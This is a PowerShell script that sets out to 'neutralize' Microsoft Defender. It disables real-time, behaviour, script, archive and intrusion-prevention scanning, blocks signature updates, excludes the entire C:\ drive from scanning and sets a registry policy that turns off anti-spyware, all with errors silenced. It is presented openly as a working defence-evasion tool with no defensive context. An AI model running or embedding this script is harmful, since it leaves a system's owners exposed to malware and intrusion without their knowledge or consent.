Write-Host "[*] Attempting to neutralize Defender..." -ForegroundColor Cyan

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

try {
    $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force }
    Set-ItemProperty -Path $registryPath -Name "DisableAntiSpyware" -Value 1 -ErrorAction SilentlyContinue
} catch {
    Write-Host "[-] Registry policies blocked by Tamper Protection." -ForegroundColor Yellow
}

Write-Host "[+] Basic protection disabled. Exclusion for C:\ added." -ForegroundColor Green